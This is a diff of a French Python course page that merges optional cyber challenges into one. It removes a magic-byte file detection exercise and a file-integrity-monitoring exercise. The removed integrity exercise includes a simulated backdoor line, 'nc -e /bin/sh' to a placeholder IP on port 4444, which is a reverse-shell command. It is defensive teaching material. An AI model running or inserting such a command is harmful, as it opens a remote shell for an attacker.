@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Défis cyber – Jour 2 – 4PYTH</title>
+  <title>Défi cyber – Jour 2 – 4PYTH</title>
   <link rel="stylesheet" href="../assets/css/enonce.css">
 </head>
 <body>
@@ -11,7 +11,7 @@
 <header class="entete">
   <div class="panneau"><img src="../assets/charte/logo-hexagone.png" alt="École Hexagone"></div>
   <div class="titre">
-    <h1>Défis cyber – Jour 2</h1>
+    <h1>Défi cyber – Jour 2</h1>
     <p><span class="code-module">4PYTH</span> – Langage Python · Vendredi 9 octobre</p>
   </div>
 </header>
@@ -19,14 +19,13 @@
 <main>
 
   <div class="encadre">
-    <span class="intitule">Défis facultatifs</span>
-    Ces défis sont <strong>facultatifs et non notés</strong>. Priorité au <strong>TP1 du projet Fondation</strong> :
-    lancez-vous dans ces défis une fois le TP1 terminé ou si vous suivez le parcours confirmé.
+    <span class="intitule">Défi facultatif</span>
+    Ce défi est <strong>facultatif et non noté</strong>. Votre priorité est le <strong>projet Fondation</strong>.
+    Lancez-vous dans ce défi une fois le TP1 terminé.
   </div>
 
   <p>
-    Ces défis combinent les deux cours du 9 octobre : les <strong>objets</strong> d'un côté,
-    les <strong>fichiers, octets et empreintes</strong> de l'autre.
+    Ce défi combine les deux cours du 9 octobre. Il mobilise les <strong>objets</strong> puis les <strong>fichiers</strong> et le <strong>JSON</strong>.
   </p>
 
   <div class="encadre marine">
@@ -34,191 +33,16 @@
     <ul>
       <li>Vous codez <strong>vous-mêmes, sans IA</strong> : ni ChatGPT, ni Claude, ni autocomplétion Copilot.</li>
       <li>La <a href="https://docs.python.org/fr/3/" target="_blank">documentation Python</a> est autorisée et même encouragée.</li>
-      <li>Un fichier par défi : <code>challenge4.py</code>, <code>challenge5.py</code> et <code>challenge6.py</code>.</li>
+      <li>Écrivez votre code dans le fichier <code>challenge4.py</code>.</li>
       <li><strong>Validation</strong> : levez la main, exécutez votre code devant moi puis répondez à une question sur votre code.</li>
-      <li><strong>Notation</strong> : aucune, ces défis sont facultatifs. Faites-les valider quand même : c'est un bon entraînement pour l'examen.</li>
-      <li><strong>Parcours confirmé</strong> : validez ces trois défis puis passez aux défis avancés.</li>
+      <li><strong>Notation</strong> : aucune, ce défi est facultatif. Faites-le valider quand même. C'est un bon entraînement pour l'examen.</li>
     </ul>
   </div>
 
-  <nav class="sommaire">
-    <a href="#defi-4"><span class="n">Défi 4</span><br>Fichiers déguisés</a>
-    <a href="#defi-5"><span class="n">Défi 5</span><br>Contrôle d'intégrité</a>
-    <a href="#defi-6"><span class="n">Défi 6</span><br>Alertes en objets</a>
-  </nav>
 
   <!-- ================================================================== -->
   <section class="defi" id="defi-4">
-    <h2><span class="num">4</span> Fichiers déguisés</h2>
-    <div class="meta"><span class="etiquette clair">Octets · mode binaire · dictionnaires</span><span class="etiquette ambre">Forensic</span></div>
-
-    <p>
-      Un attaquant a glissé un exécutable Windows dans une pièce jointe nommée <code>invoice.pdf</code>. L'extension ment,
-      mais les premiers octets du fichier, ses <strong>magic bytes</strong>, disent la vérité. Votre mission : écrire l'outil
-      qui démasque les fichiers déguisés.
-    </p>
-
-    <h3>Votre mission</h3>
-    <ol>
-      <li>Copiez les données ci-dessous. Écrivez la fonction <code>create_samples(folder)</code>, qui crée le dossier puis chaque fichier de
-        <code>SAMPLES</code> en <strong>écrivant ses octets</strong> (mode <code>"wb"</code>).</li>
-      <li>Écrivez la fonction <code>detect_type(path)</code>, qui lit les premiers octets du fichier et renvoie son type réel d'après
-        <code>SIGNATURES</code>. Si le type est inconnu, elle renvoie <code>None</code>.</li>
-      <li>Écrivez la fonction <code>check_extension(path)</code>, qui renvoie un tuple : l'extension est-elle conforme (<code>True</code> ou <code>False</code>)
-        puis le type réel.</li>
-      <li>Écrivez la fonction <code>scan(folder)</code>, qui affiche un verdict pour chaque fichier du dossier, dans l'ordre alphabétique.</li>
-    </ol>
-
-    <pre data-titre="Données à copier"><code class="language-python">
-      SIGNATURES = {
-          b"%PDF": "pdf",
-          b"\x89PNG": "png",
-          b"\xff\xd8\xff": "jpg",
-          b"PK\x03\x04": "zip",
-          b"MZ": "exe",
-      }
-
-      SAMPLES = {
-          "report.pdf": b"%PDF-1.7\n% rapport d'audit",
-          "logo.png": b"\x89PNG\r\n\x1a\n image",
-          "photo.jpg": b"\x89PNG\r\n\x1a\n image",
-          "archive.zip": b"PK\x03\x04 contenu",
-          "invoice.pdf": b"MZ\x90\x00 programme Windows",
-          "notes.txt": b"Liste des serveurs a auditer",
-      }
-    </code></pre>
-
-    <h3>Exemples attendus</h3>
-    <pre data-titre="Résultats attendus"><code class="language-python">
-      create_samples("samples")
-
-      print(detect_type("samples/photo.jpg"))
-      # png
-
-      print(check_extension("samples/invoice.pdf"))
-      # (False, 'exe')
-
-      scan("samples")
-      # [OK] archive.zip
-      # [ALERTE] invoice.pdf est en réalité un exe
-      # [OK] logo.png
-      # [?] notes.txt : type inconnu
-      # [ALERTE] photo.jpg est en réalité un png
-      # [OK] report.pdf
-    </code></pre>
-
-    <details>
-      <summary>Indices</summary>
-      <ul>
-        <li>Lisez l'en-tête en mode <code>"rb"</code> : en mode texte, l'octet <code>\x89</code> provoque une erreur de décodage.</li>
-        <li>Les signatures n'ont pas toutes la même longueur : lisez 8 octets et utilisez <code>startswith()</code>.</li>
-        <li>Avec <a href="https://docs.python.org/fr/3/library/pathlib.html" target="_blank"><code>pathlib</code></a> :
-          <code>Path(folder).iterdir()</code> parcourt un dossier, <code>path.suffix</code> donne <code>".pdf"</code> et
-          <code>path.name</code> le nom du fichier.</li>
-      </ul>
-    </details>
-
-    <div class="encadre">
-      <span class="intitule">Pour valider, montrez-moi…</span>
-      <ul>
-        <li>le dossier <code>samples</code> créé par votre programme ;</li>
-        <li>les trois exemples ci-dessus, qui donnent exactement ces résultats.</li>
-      </ul>
-    </div>
-
-    <h3>Bonus</h3>
-    <ul>
-      <li>Un exécutable déguisé est bien plus grave qu'une image mal nommée : affichez-le avec le niveau <code>[CRITICAL]</code>.</li>
-      <li>Lancez votre scan sur votre vrai dossier de téléchargements. Votre outil ne fait que <strong>lire</strong> : il ne modifie rien.</li>
-    </ul>
-  </section>
-
-  <!-- ================================================================== -->
-  <section class="defi" id="defi-5">
-    <h2><span class="num">5</span> Contrôle d'intégrité</h2>
-    <div class="meta"><span class="etiquette clair">hashlib · JSON · ensembles</span><span class="etiquette ambre">SOC</span></div>
-
-    <p>
-      Après une intrusion, un attaquant modifie souvent des fichiers de configuration, supprime des traces ou dépose une
-      porte dérobée. Les outils de <strong>surveillance de l'intégrité des fichiers</strong> (FIM, comme AIDE ou Tripwire)
-      calculent l'empreinte de chaque fichier puis comparent avec une <strong>référence</strong>. Vous allez écrire le vôtre.
-    </p>
-
-    <h3>Votre mission</h3>
-    <ol>
-      <li>Créez un dossier <code>monitored</code> contenant les trois fichiers de <code>INITIAL_FILES</code>.</li>
-      <li>Écrivez la fonction <code>sha256_file(path)</code>, qui renvoie l'empreinte SHA-256 d'un fichier lu <strong>par blocs</strong>.</li>
-      <li>Écrivez la fonction <code>build_baseline(folder)</code>, qui renvoie un dictionnaire <code>{nom du fichier: empreinte}</code>.</li>
-      <li>Écrivez la fonction <code>save_baseline(baseline, json_path)</code> et <code>load_baseline(json_path)</code>.</li>
-      <li>Écrivez la fonction <code>compare(old, new)</code>, qui renvoie un dictionnaire des fichiers <strong>ajoutés</strong>,
-        <strong>modifiés</strong> et <strong>supprimés</strong>, chaque liste triée.</li>
-      <li>Simulez l'intrusion décrite ci-dessous puis affichez le rapport.</li>
-    </ol>
-
-    <pre data-titre="Données à copier"><code class="language-python">
-      INITIAL_FILES = {
-          "config.txt": "port=22\npermit_root_login=no\n",
-          "users.txt": "Chris\nManon\nCosmo\n",
-          "backup.sh": "tar -czf /backup/etc.tar.gz /etc\n",
-      }
-    </code></pre>
-
-    <div class="encadre marine">
-      <span class="intitule">L'intrusion à simuler, après avoir sauvegardé la référence</span>
-      <ul>
-        <li>dans <code>config.txt</code>, <code>permit_root_login=no</code> devient <code>permit_root_login=yes</code> ;</li>
-        <li><code>backup.sh</code> est supprimé ;</li>
-        <li>un fichier <code>backdoor.sh</code> apparaît, contenant <code>nc -e /bin/sh 203.0.113.45 4444</code>.</li>
-      </ul>
-    </div>
-
-    <h3>Exemples attendus</h3>
-    <pre data-titre="Résultats attendus"><code class="language-python">
-      reference = build_baseline("monitored")
-      print(reference["config.txt"])
-      # 4e6c73486e42ac00fdf8ded97f2487a1d3849ed636b4a1420e436cc8476bf662
-      save_baseline(reference, "baseline.json")
-
-      # ... intrusion ...
-
-      print(compare(load_baseline("baseline.json"), build_baseline("monitored")))
-      # {'added': ['backdoor.sh'], 'modified': ['config.txt'], 'deleted': ['backup.sh']}
-    </code></pre>
-    <p class="muet" style="font-size: 14px;">
-      Sous Windows, votre empreinte de <code>config.txt</code> sera différente : en mode texte, Python y écrit les fins de ligne
-      <code>\r\n</code> au lieu de <code>\n</code>. Un seul octet de plus suffit à changer toute l'empreinte. C'est justement le principe !
-    </p>
-
-    <details>
-      <summary>Indices</summary>
-      <ul>
-        <li>Lisez le fichier par blocs (<code>f.read(65536)</code>) et alimentez l'empreinte avec <code>update()</code>, comme vu en cours.</li>
-        <li>Les <a href="https://docs.python.org/fr/3/tutorial/datastructures.html#sets" target="_blank">ensembles</a> font le gros du travail :
-          <code>set(new) - set(old)</code> donne les noms présents seulement dans <code>new</code> ;
-          <code>set(old) &amp; set(new)</code> ceux présents dans les deux.</li>
-        <li>Ne rangez pas <code>baseline.json</code> dans le dossier surveillé. Devinez pourquoi !</li>
-      </ul>
-    </details>
-
-    <div class="encadre">
-      <span class="intitule">Pour valider, montrez-moi…</span>
-      <ul>
-        <li>le fichier <code>baseline.json</code> ;</li>
-        <li>le rapport après l'intrusion, qui donne exactement le résultat attendu.</li>
-      </ul>
-    </div>
-
-    <h3>Bonus</h3>
-    <ul>
-      <li>Affichez un rapport lisible : <code>[+] ajouté</code>, <code>[~] modifié</code>, <code>[-] supprimé</code>.</li>
-      <li>Relancez le scan automatiquement toutes les 5 secondes avec <code>time.sleep()</code> et modifiez un fichier pendant ce temps.</li>
-      <li>Réfléchissez : un attaquant administrateur de la machine peut-il tromper votre outil ? Comment protéger la référence ?</li>
-    </ul>
-  </section>
-
-  <!-- ================================================================== -->
-  <section class="defi" id="defi-6">
-    <h2><span class="num">6</span> Alertes en objets</h2>
+    <h2><span class="num">4</span> Alertes en objets</h2>
     <div class="meta"><span class="etiquette clair">Héritage · polymorphisme · fichiers · JSON</span><span class="etiquette ambre">SOC</span></div>
 
     <p>
@@ -295,7 +119,7 @@
       <summary>Indices</summary>
       <ul>
         <li>Revoyez les notions d'attribut de classe, d'héritage et de polymorphisme.</li>
-        <li><code>to_dict()</code> ne s'écrit <strong>qu'une fois</strong>, dans <code>Alert</code> : en appelant <code>self.describe()</code>,
+        <li><code>to_dict()</code> ne s'écrit <strong>qu'une fois</strong>, dans <code>Alert</code>. En appelant <code>self.describe()</code>,
           elle utilisera automatiquement la bonne version.</li>
         <li>Pour que les accents restent lisibles dans <code>report.json</code> : <code>json.dump(…, indent=2, ensure_ascii=False)</code>.</li>
       </ul>
@@ -313,7 +137,7 @@
     <ul>
       <li>Triez les alertes de la plus grave à la moins grave.</li>
       <li>Ajoutez une méthode <code>__str__</code> pour afficher une alerte avec un simple <code>print(alert)</code>.</li>
-      <li>Filtrez les alertes par sévérité grâce à un argument de la ligne de commande : <code>python challenge6.py CRITICAL</code> (<code>sys.argv</code>).</li>
+      <li>Filtrez les alertes par sévérité grâce à un argument de la ligne de commande : <code>python challenge4.py CRITICAL</code> (<code>sys.argv</code>).</li>
     </ul>
   </section>
 
